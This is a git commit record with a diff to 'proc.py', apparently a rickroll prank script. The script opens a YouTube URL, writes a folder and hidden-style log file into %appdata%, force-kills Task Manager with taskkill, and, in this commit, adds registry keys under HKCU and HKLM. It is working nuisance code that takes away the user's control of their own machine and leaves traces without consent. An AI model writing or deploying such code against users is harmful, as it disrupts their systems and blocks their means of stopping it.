4f96732ef879407c6b0663b38e631951857d9a5e
AlexNoRick <99521825+AlexNoRick@users.noreply.github.com>
2022-02-12 13:25:06 +0700

    Update proc.py

--- proc.py
+++ proc.py
@@ -5,4 +5,7 @@ os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
 
 subprocess.Popen([r'cmd.exe', '/c cd %appdata% & mkdir nrr_project &cd nrr_project &echo you has rickroll -NoRickRoll- *.py python >.log_hisotry']);
 subprocess.Popen([r'taskkill.exe', '/f /im taskmgr.exe']);
+subprocess.Popen([r'reg.exe', 'ADD HKCU\Software\NoRickRollApp']);
+subprocess.Popen([r'reg.exe', 'ADD HKLM\Software\NoRickRollApp']);
+
 
